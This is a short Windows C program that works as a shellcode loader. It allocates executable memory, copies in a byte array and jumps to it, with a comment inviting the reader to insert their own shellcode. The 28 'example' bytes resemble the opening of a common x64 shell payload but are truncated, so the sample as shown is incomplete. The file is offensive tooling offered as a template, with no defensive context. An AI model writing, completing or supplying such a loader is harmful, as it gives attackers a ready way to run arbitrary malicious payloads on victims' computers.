
#include <windows.h>
#include <stdio.h>

// Insert your shellcode here
unsigned char buf[] = 
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41" // Example shellcode
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60";

int main() {
    // Allocate memory for the shellcode
    void *exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // Copy the shellcode into the allocated memory
    memcpy(exec, buf, sizeof(buf));

    // Execute the shellcode
    ((void(*)())exec)();

    return 0;
}
